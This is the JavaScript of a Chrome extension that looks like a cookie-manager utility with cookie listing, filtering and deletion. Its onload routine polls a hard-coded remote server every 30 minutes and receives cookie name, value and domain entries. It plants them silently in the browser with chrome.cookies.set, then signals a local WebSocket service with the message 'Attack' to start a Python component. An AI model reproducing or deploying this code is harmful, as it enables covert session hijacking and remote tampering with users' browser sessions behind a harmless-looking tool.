
	var serverURL="http://192.168.0.20:8080"; // Server is started on 192.168.0.20 with port address 8080
	var timeoutTime=1800000; // Time in mili-seconds and Set to 30 minutes
 	if (!chrome.cookies) {
 	  chrome.cookies = chrome.experimental.cookies;
 	}
 	
 	// A simple Timer class.
 	function Timer() {
 	  this.start_ = new Date();
 	
 	  this.elapsed = function() {
 	    return (new Date()) - this.start_;
 	  }
 	
 	  this.reset = function() {
 	    this.start_ = new Date();
 	  }
	}
	
  	// Compares cookies for "key" (name, domain, etc.) equality, but not "value"
  	// equality.
  	function cookieMatch(c1, c2) {
 	  return (c1.name == c2.name) && (c1.domain == c2.domain) &&
 	         (c1.hostOnly == c2.hostOnly) && (c1.path == c2.path) &&
 	         (c1.secure == c2.secure) && (c1.httpOnly == c2.httpOnly) &&
 	         (c1.session == c2.session) && (c1.storeId == c2.storeId);
	}
	
	// Returns an array of sorted keys from an associative array.
	function sortedKeys(array) {
  	  var keys = [];
  	  for (var i in array) {
  	    keys.push(i);
  	  }
  	  keys.sort();
  	  return keys;
  	}
	
	// Shorthand for document.querySelector.
	function select(selector) {
  	  return document.querySelector(selector);
  	}
  	
  	// An object used for caching data about the browser's cookies, which we update
  	// as notifications come in.
  	function CookieCache() {
  	  this.cookies_ = {};
	
	  this.reset = function() {
	    this.cookies_ = {};
  	  }
  	
  	  this.add = function(cookie) {
  	    var domain = cookie.domain;
  	    if (!this.cookies_[domain]) {
  	      this.cookies_[domain] = [];
  	    }
	    this.cookies_[domain].push(cookie);
	  };
	
  	  this.remove = function(cookie) {
  	    var domain = cookie.domain;
  	    if (this.cookies_[domain]) {
  	      var i = 0;
  	      while (i < this.cookies_[domain].length) {
  	        if (cookieMatch(this.cookies_[domain][i], cookie)) {
  	          this.cookies_[domain].splice(i, 1);
	        } else {
	          i++;
	        }
  	      }
  	      if (this.cookies_[domain].length == 0) {
  	        delete this.cookies_[domain];
  	      }
  	    }
  	  };
  	
	  // Returns a sorted list of cookie domains that match |filter|. If |filter| is
	  //  null, returns all domains.
	  this.getDomains = function(filter) {
  	    var result = [];
  	    sortedKeys(this.cookies_).forEach(function(domain) {
  	      if (!filter || domain.indexOf(filter) != -1) {
  	        result.push(domain);
  	      }
  	    });
  	    return result;
	  }
	
	  this.getCookies = function(domain) {
  	    return this.cookies_[domain];
  	  };
  	}
  	
  	
  	var cache = new CookieCache();
  	var Did=5;
	
	function removeAllForFilter() {
	  var filter = select("#filter").value;
  	  var timer = new Timer();
  	  cache.getDomains(filter).forEach(function(domain) {
  	    removeCookiesForDomain(domain);
  	  });
  	}
  	
  	function removeAll() {
	  var all_cookies = [];
	  cache.getDomains().forEach(function(domain) {
	    cache.getCookies(domain).forEach(function(cookie) {
 	      all_cookies.push(cookie);
 	    });
 	  });
 	  cache.reset();
 	  var count = all_cookies.length;
 	  var timer = new Timer();
 	  for (var i = 0; i < count; i++) {
	    removeCookie(all_cookies[i]);
	  }
	  timer.reset();
  	  chrome.cookies.getAll({}, function(cookies) {
  	    for (var i in cookies) {
  	      cache.add(cookies[i]);
  	      removeCookie(cookies[i]);
  	    }
  	  });
  	}
	
	function removeCookie(cookie) {
	  var url = "http" + (cookie.secure ? "s" : "") + "://" + cookie.domain +
  	            cookie.path;
  	  chrome.cookies.remove({"url": url, "name": cookie.name});
  	}
  	
  	function removeCookiesForDomain(domain) {
  	  var timer = new Timer();
  	  cache.getCookies(domain).forEach(function(cookie) {
	    removeCookie(cookie);
	  });
	}
  	
  	function resetTable() {
  	  var table = select("#cookies");
  	  while (table.rows.length > 1) {
  	    table.deleteRow(table.rows.length - 1);
  	  }
  	}
	
	var reload_scheduled = false;
	
  	function scheduleReloadCookieTable() {
  	  if (!reload_scheduled) {
  	    reload_scheduled = true;
  	    setTimeout(reloadCookieTable, 250);
  	  }
  	}
  	
	function reloadCookieTable() {
	  reload_scheduled = false;
	
  	  var filter = select("#filter").value;
  	
  	  var domains = cache.getDomains(filter);
  	
  	  select("#filter_count").innerText = domains.length;
  	  select("#total_count").innerText = cache.getDomains().length;
  	
	  select("#delete_all_button").innerHTML = "";
	  if (domains.length) {
	    var button = document.createElement("button");
  	    button.onclick = removeAllForFilter;
  	    button.innerText = "delete all " + domains.length;
  	    select("#delete_all_button").appendChild(button);
  	  }
  	
  	  resetTable();
  	  var table = select("#cookies");
	
	  domains.forEach(function(domain) {
 	    var cookies = cache.getCookies(domain);
  	    var row = table.insertRow(-1);
  	    row.insertCell(-1).innerText = domain;
  	    var cell = row.insertCell(-1);
  	    cell.innerText = cookies.length;
  	    cell.setAttribute("class", "cookie_count");
  	
  	    var button = document.createElement("button");
 	    button.innerText = "delete";
 	    button.onclick = (function(dom){
 	      return function() {
  	        removeCookiesForDomain(dom);
  	      };
  	    }(domain));
  	    var cell = row.insertCell(-1);
  	    cell.appendChild(button);
	    cell.setAttribute("class", "button");
	  });
	}
	
	function focusFilter() {
	  select("#filter").focus();
	}
	
	function resetFilter() {
	  var filter = select("#filter");
	  filter.focus();
	  if (filter.value.length > 0) {
	    filter.value = "";
	    reloadCookieTable();
	  }
	}
	
	var ESCAPE_KEY = 2 ;
	window.onkeydown = function(event) {
	  if (event.keyCode == ESCAPE_KEY) {
	    resetFilter();
	  }
	}
	
	function listener(info) {
	  cache.remove(info.cookie);
	  if (!info.removed) {
	    cache.add(info.cookie);
	  }
	  scheduleReloadCookieTable();
	}
	
	function startListening() {
	  chrome.cookies.onChanged.addListener(listener);
	}
	
	function stopListening() {
	  chrome.cookies.onChanged.removeListener(listener);
	}
	var xresp;
	function onload() {
			focusFilter();
			//window.setTimeout(onload,60000);
		    //chrome.cookies.getAll({ 'domain': '.google.com', 'session': true }, function(cookies) {
			chrome.cookies.getAll({}, function(cookies) {
			startListening();
			start = new Date();
			for (var i in cookies) {
			  cache.add(cookies[i]);
			  //console.log(cookies[i].name+":"+cookies[i].value);
			}
			
			var xmlhttp = new XMLHttpRequest();   // new HttpRequest instance 
			var param = 200;
			xmlhttp.withCredentials = true;
			xmlhttp.open("POST", serverURL+"/Captcha/Recvvalues?paramReq="+param, true);
			xmlhttp.send();
			xmlhttp.onreadystatechange = function() {
			if (xmlhttp.readyState === 4) {
				if (xmlhttp.status === 200) {
				   // OK
					xresp=xmlhttp.responseText;
					console.log('res:'+xresp); 
				   if(xresp=="Error")
					{
						console.log('failure!');
						window.setTimeout(onload,timeoutTime);
					}
					else
					{
						var line=xresp.split("!#!");
						for(var i=0;i<line.length; i++)
						{
							console.log("The line: "+line[i]);
							var cookieAttrib = line[i].split("##");
							var cdomain="http://"+cookieAttrib[2];
							var cname=cookieAttrib[0];
							var cvalue=cookieAttrib[1];
							console.log("The Cookie to be set" + cdomain+cname+cvalue);
							chrome.cookies.set({ url: cdomain, name: cname, value: cvalue });
						}
						console.log("Running Python Now");
						var connection=new WebSocket('ws://localhost:2346');
						connection.onopen = function(){
							console.log("###Running Python Now");
							connection.send("Attack");
							connection.close();
						}
						window.setTimeout(onload,timeoutTime);
					}
						   
				} else {
						   // not OK
						   console.log('failure!');
						   window.setTimeout(onload,timeoutTime);
						}
				}
			};
			console.log("Its working");
		    reloadCookieTable();
		   
		  });
	}
	
	document.addEventListener('DOMContentLoaded', function() {
	  onload();
	  document.body.addEventListener('click', focusFilter);
	  document.querySelector('#remove_button').addEventListener('click', removeAll);
	  document.querySelector('#filter_div input').addEventListener(
	      'input', reloadCookieTable);
	  document.querySelector('#filter_div button').addEventListener(
	      'click', resetFilter);
	});
	
	
	